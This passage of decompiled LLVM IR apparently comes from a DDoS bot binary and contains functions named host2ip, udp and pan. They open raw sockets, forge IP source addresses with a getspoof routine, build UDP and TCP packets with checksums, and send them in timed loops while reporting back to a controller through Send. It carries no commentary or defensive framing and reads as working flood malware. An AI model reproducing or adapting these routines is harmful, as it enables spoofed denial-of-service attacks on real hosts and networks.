  store i32 %v2_10001be4, i32* %r9.global-to-local, align 4
  %v1_10001be8 = add i32 %v2_10001be4, 12
  %v2_10001be8 = inttoptr i32 %v1_10001be8 to i8*
  %v3_10001be8 = load i8, i8* %v2_10001be8, align 1
  %v3_10001bf0 = icmp eq i8 %v3_10001be8, 46
  br i1 %v3_10001bf0, label %dec_label_pc_10001bf8, label %dec_label_pc_10001c04

dec_label_pc_10001bf8:                            ; preds = %dec_label_pc_10001bdc
  store i32 %stack_var_-308.113, i32* %r9.global-to-local, align 4
  %v1_10001bfc = add i32 %stack_var_-308.113, 1
  br label %dec_label_pc_10001c04

dec_label_pc_10001c04:                            ; preds = %dec_label_pc_10001bdc, %dec_label_pc_10001bf8
  %stack_var_-308.0 = phi i32 [ %v1_10001bfc, %dec_label_pc_10001bf8 ], [ %stack_var_-308.113, %dec_label_pc_10001bdc ]
  store i32 %stack_var_-304.014, i32* %r9.global-to-local, align 4
  %v1_10001c08 = add i32 %stack_var_-304.014, 1
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c1c = call i32 @__GI_strlen()
  %v2_10001c24 = icmp ult i32 %v1_10001c08, %v0_10001c1c
  br i1 %v2_10001c24, label %dec_label_pc_10001bdc, label %dec_label_pc_10001c2c

dec_label_pc_10001c2c:                            ; preds = %dec_label_pc_10001c10.preheader, %dec_label_pc_10001c04
  %stack_var_-308.1.lcssa = phi i32 [ 1, %dec_label_pc_10001c10.preheader ], [ %stack_var_-308.0, %dec_label_pc_10001c04 ]
  %v1_10001c30 = sub i32 4, %stack_var_-308.1.lcssa
  store i32 %v1_10001c30, i32* %r9.global-to-local, align 4
  %v2_10001c8c4 = icmp sgt i32 %v1_10001c30, 0
  %v4_10001c8c6 = icmp eq i32 %v1_10001c30, 0
  br i1 %v2_10001c8c4, label %dec_label_pc_10001c44, label %dec_label_pc_10001c94

dec_label_pc_10001c44:                            ; preds = %dec_label_pc_10001c2c, %dec_label_pc_10001c44
  %storemerge27 = phi i32 [ %v1_10001c7c, %dec_label_pc_10001c44 ], [ 0, %dec_label_pc_10001c2c ]
  store i32 %v2_10001b68, i32* @r3, align 4
  %v0_10001c50 = call i32 @__GI_strlen()
  %v2_10001c58 = add i32 %v2_10001b68, %v0_10001c50
  store i32 %v2_10001c58, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v3_10001c70 = inttoptr i32 %v2_10001c58 to i16*
  store i16 11824, i16* %v3_10001c70, align 2
  %v0_10001c74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10001c74 = trunc i32 %v0_10001c74 to i8
  %v2_10001c74 = load i32, i32* %r11.global-to-local, align 4
  %v3_10001c74 = add i32 %v2_10001c74, 2
  %v4_10001c74 = inttoptr i32 %v3_10001c74 to i8*
  store i8 %v1_10001c74, i8* %v4_10001c74, align 1
  %v1_10001c7c = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_10001c30, i32* %r9.global-to-local, align 4
  %v2_10001c8c = icmp slt i32 %v1_10001c7c, %v1_10001c30
  br i1 %v2_10001c8c, label %dec_label_pc_10001c44, label %dec_label_pc_10001c94

dec_label_pc_10001c94:                            ; preds = %dec_label_pc_10001c44, %dec_label_pc_10001c2c
  store i32 %v2_10001b68, i32* @r3, align 4
  %v2_10001c9c = call i32 @inet_network(i32 %v2_10001b68, i32 %v1_10001c30)
  store i32 %v2_10001c9c, i32* %stack_var_-312, align 4
  br i1 %v4_10001c8c6, label %dec_label_pc_10001cb4, label %dec_label_pc_10001cc4

dec_label_pc_10001cb4:                            ; preds = %dec_label_pc_10001c94
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10001cdc

dec_label_pc_10001cc4:                            ; preds = %dec_label_pc_10001c94
  %v2_10001ccc = call i32 @pow(i32 256, i32 %v1_10001c30)
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10001ce0.pre = load i32, i32* %stack_var_-312, align 4
  br label %dec_label_pc_10001cdc

dec_label_pc_10001cdc:                            ; preds = %dec_label_pc_10001cb4, %dec_label_pc_10001cc4
  %v0_10001d0017 = phi i32 [ %v2_10001c9c, %dec_label_pc_10001cb4 ], [ %v2_10001ccc, %dec_label_pc_10001cc4 ]
  %v3_10001ce0 = phi i32 [ %v2_10001c9c, %dec_label_pc_10001cb4 ], [ %v3_10001ce0.pre, %dec_label_pc_10001cc4 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10001cb4 ], [ %v2_10001ccc, %dec_label_pc_10001cc4 ]
  store i32 %storemerge, i32* @global_var_1002efc4.28, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v4_10001ce4 = inttoptr i32 %v3_10001ce0 to i8*
  store i8* %v4_10001ce4, i8** @global_var_1002efc0.27, align 4
  br label %dec_label_pc_10001ce8

dec_label_pc_10001ce8:                            ; preds = %dec_label_pc_10001b40, %dec_label_pc_10001aec, %dec_label_pc_10001cdc
  %v0_10001d00 = phi i32 [ %v6_10001b54, %dec_label_pc_10001b40 ], [ %v6_10001b00, %dec_label_pc_10001aec ], [ %v0_10001d0017, %dec_label_pc_10001cdc ]
  %v2_10001ce8 = load i32, i32* %stack_var_-320, align 4
  store i32 %v2_10001ce8, i32* %r11.global-to-local, align 4
  ret i32 %v0_10001d00

; uselistorder directives
  uselistorder i32 %v2_10001ccc, { 1, 0 }
  uselistorder i32 %v2_10001c9c, { 1, 0, 2 }
  uselistorder i32 %v1_10001c7c, { 1, 0 }
  uselistorder i32 %v1_10001c30, { 3, 6, 5, 4, 0, 1, 2 }
  uselistorder i32 %stack_var_-308.113, { 2, 0, 1 }
  uselistorder i32 %stack_var_-304.014, { 1, 2, 0 }
  uselistorder i32 %v2_10001b68, { 3, 2, 0, 4, 5, 1, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 6, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i32, i32)* @pow, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001ce8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001cdc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c44, { 1, 0 }
  uselistorder label %dec_label_pc_10001c2c, { 1, 0 }
  uselistorder label %dec_label_pc_10001c04, { 1, 0 }
  uselistorder label %dec_label_pc_10001bdc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c10.preheader, { 1, 0 }
}

define i32 @host2ip(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268442920, i32* @lr, align 4
  %v1_10001d24 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_10001d24, i32* @global_var_1002efcc.88, align 4
  %v4_10001d40 = icmp eq i32 %v1_10001d24, -1
  br i1 %v4_10001d40, label %dec_label_pc_10001d48, label %dec_label_pc_10001dbc

dec_label_pc_10001d48:                            ; preds = %entry
  store i32 268442960, i32* @lr, align 4
  %v2_10001d4c = call i32 @__GI_gethostbyname(i32 %arg2, i32 -1)
  %v3_10001d5c = icmp eq i32 %v2_10001d4c, 0
  br i1 %v3_10001d5c, label %dec_label_pc_10001d64, label %dec_label_pc_10001d90

dec_label_pc_10001d64:                            ; preds = %dec_label_pc_10001d48
  %v3_10001d68 = load i32, i32* @global_var_1002efd8.22, align 4
  %v6_10001d84 = call i32 @Send(i32 %v3_10001d68, i32 ptrtoint ([33 x i8]* @global_var_10017f64.89 to i32), i32 %arg1, i32 %arg2)
  %v0_10001d8c = call i32 @__GI_exit()
  br label %dec_label_pc_10001d90

dec_label_pc_10001d90:                            ; preds = %dec_label_pc_10001d48, %dec_label_pc_10001d64
  %v1_10001d94 = add i32 %v2_10001d4c, 16
  %v2_10001d94 = inttoptr i32 %v1_10001d94 to i32*
  %v3_10001d94 = load i32, i32* %v2_10001d94, align 4
  %v1_10001d98 = inttoptr i32 %v3_10001d94 to i32*
  %v2_10001d98 = load i32, i32* %v1_10001d98, align 4
  %v1_10001da8 = add i32 %v2_10001d4c, 12
  %v2_10001da8 = inttoptr i32 %v1_10001da8 to i32*
  %v3_10001da8 = load i32, i32* %v2_10001da8, align 4
  store i32 %v3_10001da8, i32* @r5, align 4
  store i32 268443068, i32* @lr, align 4
  %v4_10001db8 = call i32 @bcopy(i32 %v2_10001d98, i32 ptrtoint (i32* @global_var_1002efcc.88 to i32), i32 %v3_10001da8, i32 %v2_10001d4c)
  %v3_10001dc0.pre = load i32, i32* @global_var_1002efcc.88, align 4
  br label %dec_label_pc_10001dbc

dec_label_pc_10001dbc:                            ; preds = %entry, %dec_label_pc_10001d90
  %v3_10001dc0 = phi i32 [ %v1_10001d24, %entry ], [ %v3_10001dc0.pre, %dec_label_pc_10001d90 ]
  ret i32 %v3_10001dc0

; uselistorder directives
  uselistorder i32 %v3_10001da8, { 1, 0 }
  uselistorder i32 %v2_10001d4c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10001dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10001d90, { 1, 0 }
}

define i32 @udp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1508 = alloca i32, align 4
  %stack_var_-1516 = alloca i32, align 4
  %stack_var_-1536 = alloca i32, align 4
  store i32 268443156, i32* @lr, align 4
  %v1_10001e10 = call i32 @__GI_time(i32 0)
  %v1_10001e20 = call i32 @mfork(i32 %arg2)
  %v3_10001e28 = icmp eq i32 %v1_10001e20, 0
  br i1 %v3_10001e28, label %dec_label_pc_10001e30, label %dec_label_pc_10002108

dec_label_pc_10001e30:                            ; preds = %entry
  store i32 268443200, i32* @lr, align 4
  %v3_10001e3c = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp32 = icmp sgt i32 %v3_10001e3c, -1
  br i1 %tmp32, label %dec_label_pc_10001e5c, label %dec_label_pc_10001e54

dec_label_pc_10001e54:                            ; preds = %dec_label_pc_10001e30
  %v0_10001e58 = call i32 @__GI_exit()
  br label %dec_label_pc_10001e5c

dec_label_pc_10001e5c:                            ; preds = %dec_label_pc_10001e30, %dec_label_pc_10001e54
  %v2_10001e60 = icmp sgt i32 %arg3, 2
  br i1 %v2_10001e60, label %dec_label_pc_10001e88, label %dec_label_pc_10001e68

dec_label_pc_10001e68:                            ; preds = %dec_label_pc_10001e5c
  %v6_10001e7c = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_10017f88.91 to i32), i32 %arg2, i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32))
  %v0_10001e84 = call i32 @__GI_exit()
  br label %dec_label_pc_10001e88

dec_label_pc_10001e88:                            ; preds = %dec_label_pc_10001e5c, %dec_label_pc_10001e68
  %v1_10001e8c = add i32 %arg4, 4
  %v1_10001e90 = inttoptr i32 %v1_10001e8c to i32*
  %v2_10001e90 = load i32, i32* %v1_10001e90, align 4
  store i32 268443296, i32* @lr, align 4
  %v3_10001e9c = call i32 @host2ip(i32 %arg2, i32 %v2_10001e90, i32 %v1_10001e8c)
  %v1_10001eac = add i32 %arg4, 8
  %v1_10001eb0 = inttoptr i32 %v1_10001eac to i32*
  %v2_10001eb0 = load i32, i32* %v1_10001eb0, align 4
  store i32 268443324, i32* @lr, align 4
  %v2_10001eb8 = call i32 @atol(i32 %v2_10001eb0, i32 %v1_10001eac)
  %v1_10001ec8 = add i32 %arg4, 12
  %v1_10001ecc = inttoptr i32 %v1_10001ec8 to i32*
  %v2_10001ecc = load i32, i32* %v1_10001ecc, align 4
  store i32 268443352, i32* @lr, align 4
  %v2_10001ed4 = call i32 @atol(i32 %v2_10001ecc, i32 %v1_10001ec8)
  %v2_10001ee0 = ptrtoint i32* %stack_var_-1536 to i32
  %v2_10001eec = ptrtoint i32* %stack_var_-1516 to i32
  %tmp33 = bitcast i32* %stack_var_-1516 to i16*
  %v2_10001ef8 = ptrtoint i32* %stack_var_-1508 to i32
  store i32 268443408, i32* @lr, align 4
  %v3_10001f0c = call i32 @__GI_memset(i32 %v2_10001ef8, i32 10, i32 1472)
  %v2_10001f18 = load i32, i32* %v1_10001e90, align 4
  %v6_10001f34 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_10017fb0.93 to i32), i32 %arg2, i32 %v2_10001f18)
  %v1_10001f44 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10001f44, i32* %stack_var_-1536, align 4
  %v1_10001f58 = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_10001f58, i32* %stack_var_-1536, align 4
  %v3_10001f68 = or i32 %v2_10001ee0, 1
  %v4_10001f68 = inttoptr i32 %v3_10001f68 to i8*
  store i8 0, i8* %v4_10001f68, align 1
  %v3_10001f74 = or i32 %v2_10001ee0, 2
  %v4_10001f74 = inttoptr i32 %v3_10001f74 to i16*
  store i16 1500, i16* %v4_10001f74, align 2
  %v3_10001f80 = add i32 %v2_10001ee0, 6
  %v4_10001f80 = inttoptr i32 %v3_10001f80 to i16*
  store i16 0, i16* %v4_10001f80, align 2
  %v3_10001f8c = add i32 %v2_10001ee0, 9
  %v4_10001f8c = inttoptr i32 %v3_10001f8c to i8*
  store i8 17, i8* %v4_10001f8c, align 1
  %v3_10001f98 = add i32 %v2_10001ee0, 8
  %v4_10001f98 = inttoptr i32 %v3_10001f98 to i8*
  store i8 64, i8* %v4_10001f98, align 4
  %v2_10001fa4 = add i32 %v2_10001ee0, 16
  %v3_10001fa4 = inttoptr i32 %v2_10001fa4 to i32*
  store i32 %v3_10001e9c, i32* %v3_10001fa4, align 4
  %v1_10001fac = urem i32 %tmp10, 65536
  store i32 %v1_10001fac, i32* @r3, align 4
  %v1_10001fb4 = call i32 @htons(i32 %v1_10001fac)
  %v1_10001fc0 = trunc i32 %v1_10001fb4 to i16
  %v3_10001fc0 = add i32 %v2_10001eec, 4
  %v4_10001fc0 = inttoptr i32 %v3_10001fc0 to i16*
  store i16 %v1_10001fc0, i16* %v4_10001fc0, align 4
  store i32 2, i32* %stack_var_-1552, align 4
  %v3_10001fec = icmp eq i32 %v2_10001eb8, 0
  %v3_10002024 = or i32 %v2_10001eec, 2
  %v4_10002024 = inttoptr i32 %v3_10002024 to i16*
  %v2_10002034 = bitcast i32* %stack_var_-1536 to i16*
  %v3_10002040 = add i32 %v2_10001eec, 6
  %v4_10002040 = inttoptr i32 %v3_10002040 to i16*
  %v2_10002050 = add i32 %v2_10001ee0, 12
  %v3_10002050 = inttoptr i32 %v2_10002050 to i32*
  %v3_10002064 = add i32 %v2_10001ee0, 4
  %v4_10002064 = inttoptr i32 %v3_10002064 to i16*
  %v3_10002080 = add i32 %v2_10001ee0, 10
  %v4_10002080 = inttoptr i32 %v3_10002080 to i16*
  %v2_10002094 = ptrtoint i32* %stack_var_-1552 to i32
  %v2_100020dc = add i32 %v2_10001ed4, %v1_10001e10
  %v1_10001ff8 = urem i32 %v2_10001eb8, 65536
  br label %dec_label_pc_10001fd4

dec_label_pc_10001fd4:                            ; preds = %dec_label_pc_100020f8, %dec_label_pc_10001e88
  %stack_var_-1560.0 = phi i32 [ 0, %dec_label_pc_10001e88 ], [ %v1_100020fc, %dec_label_pc_100020f8 ]
  store i32 268443608, i32* @lr, align 4
  %v0_10001fd4 = call i32 @random()
  %v1_10001fe4 = trunc i32 %v0_10001fd4 to i16
  store i16 %v1_10001fe4, i16* %tmp33, align 4
  br i1 %v3_10001fec, label %dec_label_pc_10002014, label %dec_label_pc_10001ff4

dec_label_pc_10001ff4:                            ; preds = %dec_label_pc_10001fd4
  store i32 %v1_10001ff8, i32* @r3, align 4
  %v1_10002000 = call i32 @htons(i32 %v1_10001ff8)
  %extract.t = trunc i32 %v1_10002000 to i16
  br label %dec_label_pc_10002028

dec_label_pc_10002014:                            ; preds = %dec_label_pc_10001fd4
  store i32 268443672, i32* @lr, align 4
  %v0_10002014 = call i32 @random()
  %extract.t41 = trunc i32 %v0_10002014 to i16
  br label %dec_label_pc_10002028

dec_label_pc_10002028:                            ; preds = %dec_label_pc_10001ff4, %dec_label_pc_10002014
  %v1_10002004.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10001ff4 ], [ %extract.t41, %dec_label_pc_10002014 ]
  store i16 %v1_10002004.sink.off0, i16* %v4_10002024, align 2
  %v3_10002034 = call i32 @in_cksum(i16* %v2_10002034, i32 1500)
  %sext3 = mul i32 %v3_10002034, 65536
  %v1_10002038 = sdiv i32 %sext3, 65536
  %v1_10002040 = trunc i32 %v1_10002038 to i16
  store i16 %v1_10002040, i16* %v4_10002040, align 2
  %v0_10002044 = call i32 @getspoof()
  store i32 %v0_10002044, i32* %v3_10002050, align 4
  store i32 268443736, i32* @lr, align 4
  %v0_10002054 = call i32 @random()
  %v1_10002064 = trunc i32 %v0_10002054 to i16
  store i16 %v1_10002064, i16* %v4_10002064, align 4
  %v3_10002074 = call i32 @in_cksum(i16* %v2_10002034, i32 1500)
  %v1_10002080 = trunc i32 %v3_10002074 to i16
  store i16 %v1_10002080, i16* %v4_10002080, align 2
  store i32 268443832, i32* @lr, align 4
  %v6_100020b4 = call i32 @sendto(i32 %v3_10001e3c, i32 %v2_10001ee0, i32 1500, i32 0, i32 %v2_10002094, i32 16)
  %tmp34 = icmp ult i32 %stack_var_-1560.0, 50
  br i1 %tmp34, label %dec_label_pc_100020f8, label %dec_label_pc_100020c4

dec_label_pc_100020c4:                            ; preds = %dec_label_pc_10002028
  store i32 268443852, i32* @lr, align 4
  %v1_100020c8 = call i32 @__GI_time(i32 0)
  %v2_100020e0 = icmp ult i32 %v1_100020c8, %v2_100020dc
  br i1 %v2_100020e0, label %dec_label_pc_100020f0, label %dec_label_pc_100020e8

dec_label_pc_100020e8:                            ; preds = %dec_label_pc_100020c4
  %v0_100020ec = call i32 @__GI_exit()
  br label %dec_label_pc_100020f0

dec_label_pc_100020f0:                            ; preds = %dec_label_pc_100020c4, %dec_label_pc_100020e8
  br label %dec_label_pc_100020f8

dec_label_pc_100020f8:                            ; preds = %dec_label_pc_10002028, %dec_label_pc_100020f0
  %stack_var_-1560.1 = phi i32 [ %stack_var_-1560.0, %dec_label_pc_10002028 ], [ 0, %dec_label_pc_100020f0 ]
  %v1_100020fc = add i32 %stack_var_-1560.1, 1
  br label %dec_label_pc_10001fd4

dec_label_pc_10002108:                            ; preds = %entry
  ret i32 %v1_10001e20

; uselistorder directives
  uselistorder i32 %v1_10001ff8, { 1, 0 }
  uselistorder i32 %v1_10001fac, { 1, 0 }
  uselistorder i32 %v2_10001ee0, { 9, 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32* %stack_var_-1536, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-1552, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100020f8, { 1, 0 }
  uselistorder label %dec_label_pc_100020f0, { 1, 0 }
  uselistorder label %dec_label_pc_10002028, { 1, 0 }
  uselistorder label %dec_label_pc_10001e88, { 1, 0 }
  uselistorder label %dec_label_pc_10001e5c, { 1, 0 }
}

define i32 @pan(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v2_1000214c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_1000214c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10017fcc.95 to i32), i32* @r4, align 4
  store i32 80, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10002164.96 to i32), i32* @lr, align 4
  %v0_10002160 = call i32 @memcpy()
  store i32 268444028, i32* @lr, align 4
  %v1_10002178 = call i32 @__GI_time(i32 0)
  %v1_10002188 = call i32 @mfork(i32 %arg2)
  %v3_10002190 = icmp eq i32 %v1_10002188, 0
  br i1 %v3_10002190, label %dec_label_pc_10002198, label %dec_label_pc_10002608

dec_label_pc_10002198:                            ; preds = %entry
  %v2_1000219c = icmp sgt i32 %arg3, 2
  br i1 %v2_1000219c, label %dec_label_pc_100021c4, label %dec_label_pc_100021a4

dec_label_pc_100021a4:                            ; preds = %dec_label_pc_10002198
  %v5_100021b8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1001801c.97 to i32), i32 %arg2, i32 268566528)
  %v0_100021c0 = call i32 @__GI_exit()
  br label %dec_label_pc_100021c4

dec_label_pc_100021c4:                            ; preds = %dec_label_pc_10002198, %dec_label_pc_100021a4
  store i32 268444116, i32* @lr, align 4
  %v3_100021d0 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp71 = icmp sgt i32 %v3_100021d0, -1
  br i1 %tmp71, label %dec_label_pc_10002234.preheader, label %dec_label_pc_100021e8

dec_label_pc_100021e8:                            ; preds = %dec_label_pc_100021c4
  %v0_100021ec = call i32 @__GI_exit()
  br label %dec_label_pc_10002234.preheader

dec_label_pc_10002234.preheader:                  ; preds = %dec_label_pc_100021c4, %dec_label_pc_100021e8
  store i32 0, i32* %stack_var_-280, align 4
  %v2_10002208 = ptrtoint i32* %stack_var_-280 to i32
  %v2_1000220c = add i32 %v2_10002208, 168
  %v2_10002220 = add i32 %v2_10002208, 80
  br label %dec_label_pc_100021fc

dec_label_pc_100021fc:                            ; preds = %dec_label_pc_10002234.preheader, %dec_label_pc_100021fc
  %v3_100021fc = phi i32 [ 0, %dec_label_pc_10002234.preheader ], [ %v1_1000222c, %dec_label_pc_100021fc ]
  %v1_10002204 = mul i32 %v3_100021fc, 4
  %v1_10002210 = add i32 %v2_1000220c, %v1_10002204
  %v1_10002214 = inttoptr i32 %v1_10002210 to i32*
  %v2_10002214 = load i32, i32* %v1_10002214, align 4
  %v1_10002224 = trunc i32 %v2_10002214 to i8
  %v3_10002224 = add i32 %v2_10002220, %v3_100021fc
  %v4_10002224 = inttoptr i32 %v3_10002224 to i8*
  store i8 %v1_10002224, i8* %v4_10002224, align 1
  %v3_10002228 = load i32, i32* %stack_var_-280, align 4
  %v1_1000222c = add i32 %v3_10002228, 1
  store i32 %v1_1000222c, i32* %stack_var_-280, align 4
  %tmp72 = icmp slt i32 %v1_1000222c, 20
  br i1 %tmp72, label %dec_label_pc_100021fc, label %dec_label_pc_10002240

dec_label_pc_10002240:                            ; preds = %dec_label_pc_100021fc
  %v1_10002244 = add i32 %arg4, 4
  %v1_10002248 = inttoptr i32 %v1_10002244 to i32*
  %v2_10002248 = load i32, i32* %v1_10002248, align 4
  store i32 268444248, i32* @lr, align 4
  %v3_10002254 = call i32 @host2ip(i32 %arg2, i32 %v2_10002248, i32 %v1_10002244)
  %v1_10002264 = add i32 %arg4, 12
  %v1_10002268 = inttoptr i32 %v1_10002264 to i32*
  %v2_10002268 = load i32, i32* %v1_10002268, align 4
  store i32 268444276, i32* @lr, align 4
  %v2_10002270 = call i32 @atol(i32 %v2_10002268, i32 %v1_10002264)
  %v2_10002284 = load i32, i32* %v1_10002248, align 4
  %v6_100022a0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_10018044.101 to i32), i32 %arg2, i32 %v2_10002284)
  %v1_100022ac = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v1_100022bc = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_100022bc, i32* %stack_var_-240, align 4
  %v1_100022f4 = call i32 @__asm_rlwimi(i32 10, i32 24, i32 4, i32 7)
  %v1_10002304 = call i32 @__asm_rlwimi(i32 0, i32 28, i32 0, i32 3)
  %v1_10002310 = call i32 @__asm_rlwinm(i32 %v1_10002304, i32 0, i32 16, i32 14)
  %v1_1000231c = call i32 @__asm_rlwinm(i32 %v1_10002310, i32 0, i32 15, i32 13)
  %v1_10002328 = call i32 @__asm_rlwinm(i32 %v1_1000231c, i32 0, i32 14, i32 12)
  %v1_10002334 = call i32 @__asm_rlwinm(i32 %v1_10002328, i32 0, i32 13, i32 11)
  %v1_10002340 = call i32 @__asm_rlwinm(i32 %v1_10002334, i32 0, i32 12, i32 10)
  %v1_1000234c = call i32 @__asm_rlwinm(i32 %v1_10002340, i32 0, i32 11, i32 9)
  %v1_10002358 = call i32 @__asm_rlwinm(i32 %v1_1000234c, i32 0, i32 9, i32 7)
  %v1_10002380 = add i32 %arg4, 8
  %v1_10002384 = inttoptr i32 %v1_10002380 to i32*
  %v2_10002384 = load i32, i32* %v1_10002384, align 4
  store i32 268444560, i32* @lr, align 4
  %v2_1000238c = call i32 @atol(i32 %v2_10002384, i32 %v1_10002380)
  %v1_10002394 = urem i32 %v2_1000238c, 65536
  store i32 %v1_10002394, i32* @r3, align 4
  %v1_1000239c = call i32 @htons(i32 %v1_10002394)
  %v2_1000247c = ptrtoint i32* %stack_var_-240 to i32
  %v2_10002488 = bitcast i32* %stack_var_-240 to i16*
  %v2_10002530 = ptrtoint i32* %stack_var_-220 to i32
  %v2_10002534 = ptrtoint i32* %stack_var_-180 to i32
  %v2_10002538 = ptrtoint i32* %stack_var_-168 to i32
  %v2_10002550 = ptrtoint i32* %stack_var_-200 to i32
  %v2_10002558 = ptrtoint i32* %stack_var_-148 to i32
  %v2_10002580 = bitcast i32* %stack_var_-180 to i16*
  %v2_10002594 = ptrtoint i32* %stack_var_-128 to i32
  %v2_100025dc = add i32 %v2_10002270, %v1_10002178
  br label %dec_label_pc_100023a8

dec_label_pc_100023a8:                            ; preds = %dec_label_pc_100025f8, %dec_label_pc_10002240
  %stack_var_-244.0 = phi i32 [ 0, %dec_label_pc_10002240 ], [ %v1_100025fc, %dec_label_pc_100025f8 ]
  store i32 268444588, i32* @lr, align 4
  %v0_100023a8 = call i32 @random()
  %v2_100023bc = load i32, i32* %v1_10002384, align 4
  store i32 268444616, i32* @lr, align 4
  %v2_100023c4 = call i32 @atol(i32 %v2_100023bc, i32 %v1_10002380)
  %v3_100023cc = icmp eq i32 %v2_100023c4, 0
  br i1 %v3_100023cc, label %dec_label_pc_100023d4, label %dec_label_pc_100023e0

dec_label_pc_100023d4:                            ; preds = %dec_label_pc_100023a8
  store i32 268444632, i32* @lr, align 4
  %v0_100023d4 = call i32 @random()
  br label %dec_label_pc_100023e0

dec_label_pc_100023e0:                            ; preds = %dec_label_pc_100023a8, %dec_label_pc_100023d4
  %v0_100023e0 = call i32 @getspoof()
  store i32 60, i32* @r3, align 4
  %v1_10002400 = call i32 @htons(i32 60)
  store i32 268444688, i32* @lr, align 4
  %v0_1000240c = call i32 @random()
  %v1_10002438 = urem i32 %v0_100023a8, 65536
  store i32 %v1_10002438, i32* %stack_var_-220, align 4
  store i32 268444752, i32* @lr, align 4
  %v0_1000244c = call i32 @random()
  store i32 2, i32* %stack_var_-128, align 4
  %v3_10002488 = call i32 @in_cksum(i16* %v2_10002488, i32 20)
  store i32 268444824, i32* @lr, align 4
  %v0_10002494 = call i32 @random()
  store i32 %v0_100023e0, i32* %stack_var_-180, align 4
  store i32 40, i32* @r3, align 4
  %v1_10002520 = call i32 @htons(i32 40)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000254c.102 to i32), i32* @lr, align 4
  %v4_10002548 = call i32 @bcopy(i32 %v2_10002530, i32 %v2_10002538, i32 20, i32 %v2_10002534)
  store i32 20, i32* @r5, align 4
  store i32 268445036, i32* @lr, align 4
  %v4_10002568 = call i32 @bcopy(i32 %v2_10002550, i32 %v2_10002558, i32 20, i32 %v2_10002534)
  %v3_10002580 = call i32 @in_cksum(i16* %v2_10002580, i32 52)
  store i32 268445112, i32* @lr, align 4
  %v6_100025b4 = call i32 @sendto(i32 %v3_100021d0, i32 %v2_1000247c, i32 60, i32 0, i32 %v2_10002594, i32 16)
  %tmp73 = icmp ult i32 %stack_var_-244.0, 50
  br i1 %tmp73, label %dec_label_pc_100025f8, label %dec_label_pc_100025c4

dec_label_pc_100025c4:                            ; preds = %dec_label_pc_100023e0
  store i32 268445132, i32* @lr, align 4
  %v1_100025c8 = call i32 @__GI_time(i32 0)
  %v2_100025e0 = icmp ult i32 %v1_100025c8, %v2_100025dc
  br i1 %v2_100025e0, label %dec_label_pc_100025f0, label %dec_label_pc_100025e8

dec_label_pc_100025e8:                            ; preds = %dec_label_pc_100025c4
  %v0_100025ec = call i32 @__GI_exit()
  br label %dec_label_pc_100025f0

dec_label_pc_100025f0:                            ; preds = %dec_label_pc_100025c4, %dec_label_pc_100025e8
  br label %dec_label_pc_100025f8

dec_label_pc_100025f8:                            ; preds = %dec_label_pc_100023e0, %dec_label_pc_100025f0
  %stack_var_-244.1 = phi i32 [ %stack_var_-244.0, %dec_label_pc_100023e0 ], [ 0, %dec_label_pc_100025f0 ]
  %v1_100025fc = add i32 %stack_var_-244.1, 1
  br label %dec_label_pc_100023a8

dec_label_pc_10002608:                            ; preds = %entry
  ret i32 %v1_10002188

; uselistorder directives
  uselistorder i32 %v2_10002534, { 1, 0 }
  uselistorder i32 %v1_10002394, { 1, 0 }
  uselistorder i32 %v1_1000222c, { 1, 2, 0 }
  uselistorder i32 %v3_100021fc, { 1, 0 }
